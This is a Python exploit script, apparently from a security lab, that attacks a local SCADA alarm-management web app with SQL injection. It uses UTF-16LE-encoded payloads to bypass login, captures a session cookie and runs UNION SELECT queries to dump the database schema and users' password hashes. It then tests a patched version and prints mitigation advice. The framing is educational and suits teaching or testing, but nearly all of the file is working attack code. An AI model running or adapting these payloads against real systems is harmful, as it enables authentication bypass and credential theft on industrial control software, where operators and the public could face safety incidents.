#!/usr/bin/env python3
"""
SQL Injection with UTF-16 Encoding Exploitation Script
Demonstrates encoding-based SQL injection bypass
"""

import requests
import sys

TARGET_URL = "http://localhost:5000"

def test_basic_sqli():
    """Test basic SQL injection (will likely fail on vulnerable version)"""
    print("\n[1] Testing Basic SQL Injection...")
    print("    Payload: admin' OR '1'='1'--")
    
    response = requests.post(
        f"{TARGET_URL}/login",
        data={
            'username': "admin' OR '1'='1'--",
            'password': 'anything'
        },
        allow_redirects=False
    )
    
    if response.status_code == 302:
        print("    ‚úÖ Basic SQLi SUCCESSFUL (bypassed authentication)")
        return True
    else:
        print("    ‚ùå Basic SQLi blocked/failed")
        return False

def test_utf16_sqli():
    """Test UTF-16 encoded SQL injection"""
    print("\n[2] Testing UTF-16 Encoded SQL Injection...")
    
    # SQL injection payload
    payload = "admin' OR '1'='1'--"
    print(f"    Payload: {payload}")
    
    # Encode in UTF-16LE
    encoded = payload.encode('utf-16le')
    print(f"    Encoded (UTF-16LE): {encoded.hex()[:50]}...")
    
    try:
        response = requests.post(
            f"{TARGET_URL}/login",
            headers={
                'Content-Encoding': 'utf-16le',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            data={
                'username': encoded,
                'password': 'anything'
            },
            allow_redirects=False,
            timeout=10
        )
        
        if response.status_code == 302:
            print("    ‚úÖ UTF-16 SQLi SUCCESSFUL!")
            session = response.cookies.get('session')
            if session:
                print(f"    üìã Session Cookie: {session}")
                return session
        else:
            print(f"    ‚ùå UTF-16 SQLi failed (status: {response.status_code})")
            
    except Exception as e:
        print(f"    ‚ùå Error: {e}")
    
    return None

def test_search_sqli(session_cookie):
    """Test SQL injection in search endpoint"""
    print("\n[3] Testing SQL Injection in Search API...")
    
    # UNION-based payload to extract schema (must match 14 columns of alarms table)
    payload = "' UNION SELECT sql,2,3,4,5,6,7,8,9,10,11,12,13,14 FROM sqlite_master WHERE type='table'--"
    encoded = payload.encode('utf-16le')
    
    try:
        response = requests.get(
            f"{TARGET_URL}/api/search_alarms",
            params={'q': encoded},
            headers={'Content-Encoding': 'utf-16le'},
            cookies={'session': session_cookie},
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            if 'results' in data and len(data['results']) > 0:
                print("    ‚úÖ UNION-based SQLi SUCCESSFUL!")
                print("    üìã Extracted Data Shell:")
                # In a UNION, column 1 of the second SELECT maps to column 1 of the first (id)
                for result in data['results']:
                    if 'CREATE TABLE' in str(result.get('id', '')):
                        print(f"        {result['id']}")
                return True
            else:
                print("    ‚ö†Ô∏è  Query succeeded but no data matched criteria")
        else:
            print(f"    ‚ùå Search SQLi failed (status: {response.status_code})")
            
    except Exception as e:
        print(f"    ‚ùå Error: {e}")
    
    return False

def extract_users(session_cookie):
    """Extract user credentials from database"""
    print("\n[4] Extracting User Credentials...")
    
    # Must match 14 columns: 1 (username:hash), 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14
    payload = "' UNION SELECT username || ':' || password_hash,2,3,4,5,6,7,8,9,10,11,12,13,14 FROM users--"
    encoded = payload.encode('utf-16le')
    
    try:
        response = requests.get(
            f"{TARGET_URL}/api/search_alarms",
            params={'q': encoded},
            headers={'Content-Encoding': 'utf-16le'},
            cookies={'session': session_cookie},
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            if 'results' in data and len(data['results']) > 0:
                print("    ‚úÖ User credentials extracted!")
                print("    üìã Credentials:")
                for result in data['results']:
                    # The first column SELECT maps to 'id' field in the returned JSON
                    creds = str(result.get('id', ''))
                    if ':' in creds and not creds.isdigit():
                         print(f"        {creds}")
                return True
        
        print("    ‚ùå Failed to extract credentials")
        
    except Exception as e:
        print(f"    ‚ùå Error: {e}")
    
    return False

def demonstrate_impact(session_cookie):
    """Show impact by accessing protected resources"""
    print("\n[5] Demonstrating Impact - Accessing Dashboard...")
    
    try:
        response = requests.get(
            f"{TARGET_URL}/",
            cookies={'session': session_cookie},
            timeout=10
        )
        
        if response.status_code == 200 and 'SCADA' in response.text:
            print("    ‚úÖ Successfully accessed authenticated dashboard!")
            print("    ‚ö†Ô∏è  Attacker now has full access to SCADA system")
            return True
        else:
            print("    ‚ùå Failed to access dashboard")
            
    except Exception as e:
        print(f"    ‚ùå Error: {e}")
    
    return False

def test_patched_version():
    """Test if patched version blocks SQL injection"""
    print("\n[6] Testing Patched Version (port 5001)...")
    
    patched_url = "http://localhost:5001"
    
    # Test basic SQLi
    response = requests.post(
        f"{patched_url}/login",
        data={
            'username': "admin' OR '1'='1'--",
            'password': 'anything'
        },
        allow_redirects=False,
        timeout=5
    )
    
    if response.status_code != 302:
        print("    ‚úÖ Patched version blocks basic SQLi")
    else:
        print("    ‚ùå Patched version still vulnerable!")
        return False
    
    # Test UTF-16 encoded SQLi
    payload = "admin' OR '1'='1'--"
    encoded = payload.encode('utf-16le')
    
    try:
        response = requests.post(
            f"{patched_url}/login",
            headers={'Content-Encoding': 'utf-16le'},
            data={'username': encoded, 'password': 'anything'},
            allow_redirects=False,
            timeout=5
        )
        
        if response.status_code != 302:
            print("    ‚úÖ Patched version blocks UTF-16 SQLi")
            return True
        else:
            print("    ‚ùå Patched version still vulnerable to UTF-16!")
            
    except Exception as e:
        print(f"    ‚ö†Ô∏è  Could not test patched version: {e}")
        print("        (Make sure patched version is running on port 5001)")
    
    return False

def main():
    global TARGET_URL
    print("=" * 70)
    print("      SCADA SQL Injection Exploitation Dashboard")
    print("=" * 70)
    print("Select Target Environment:")
    print("1. Vulnerable Version (Port 5000)")
    print("2. Patched Version    (Port 5001)")
    
    choice = input("\nEnter choice (1 or 2, default: 1): ").strip()
    if choice == "2":
        TARGET_URL = "http://localhost:5001"
    else:
        TARGET_URL = "http://localhost:5000"

    print("\n" + "=" * 70)
    print(f"Targeting: {TARGET_URL}")
    print("\nThis script demonstrates how SQL injection can bypass filters")
    print("using alternate character encodings (UTF-16, UTF-7, etc.)")
    print("=" * 70)
    
    # Step 1: Test basic SQLi
    basic_success = test_basic_sqli()
    
    # Step 2: Test UTF-16 encoded SQLi
    session_cookie = test_utf16_sqli()
    
    if not session_cookie:
        print("\n‚ùå UTF-16 SQLi failed. Target may be patched or unreachable.")
        print("\nüîç Troubleshooting:")
        print("   1. Ensure vulnerable version is running: python vulnerable/app.py")
        print("   2. Check if target URL is correct")
        print("   3. Verify database is initialized")
        return
    
    # Step 3: Test search API SQLi
    search_success = test_search_sqli(session_cookie)
    
    # Step 4: Extract user credentials
    extract_users(session_cookie)
    
    # Step 5: Demonstrate full access
    demonstrate_impact(session_cookie)
    
    # Step 6: Test patched version
    test_patched_version()
    
    # Summary
    print("\n" + "=" * 70)
    print("EXPLOITATION SUMMARY")
    print("=" * 70)
    print(f"‚úÖ Authentication Bypass:  {'SUCCESS' if session_cookie else 'FAILED'}")
    print(f"‚úÖ Data Exfiltration:      {'SUCCESS' if search_success else 'FAILED'}")
    print(f"‚úÖ Full System Access:     {'ACHIEVED' if session_cookie else 'FAILED'}")
    
    if session_cookie:
        print("\n‚ö†Ô∏è  IMPACT:")
        print("   ‚Ä¢ Bypassed authentication without valid credentials")
        print("   ‚Ä¢ Extracted sensitive database information")
        print("   ‚Ä¢ Gained full access to SCADA alarm management system")
        print("   ‚Ä¢ Can acknowledge, silence, or escalate alarms")
        print("   ‚Ä¢ Could cause operational safety incidents")
    
    print("\nüõ°Ô∏è  MITIGATION:")
    print("   ‚Ä¢ Use parameterized queries (prepared statements)")
    print("   ‚Ä¢ Never concatenate user input into SQL queries")
    print("   ‚Ä¢ Parameterization works regardless of encoding")
    print("   ‚Ä¢ See patched version for secure implementation")
    
    print("\nüìö LEARNING POINTS:")
    print("   ‚Ä¢ Simple character encoding can bypass basic filters")
    print("   ‚Ä¢ UTF-16, UTF-7, and other encodings are often overlooked")
    print("   ‚Ä¢ Parameterized queries provide defense-in-depth")
    print("   ‚Ä¢ Always test with multiple encodings during pentesting")
    
    print("=" * 70)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n‚úã Exploitation stopped by user")
    except Exception as e:
        print(f"\n‚ùå Unexpected error: {e}")
        sys.exit(1)
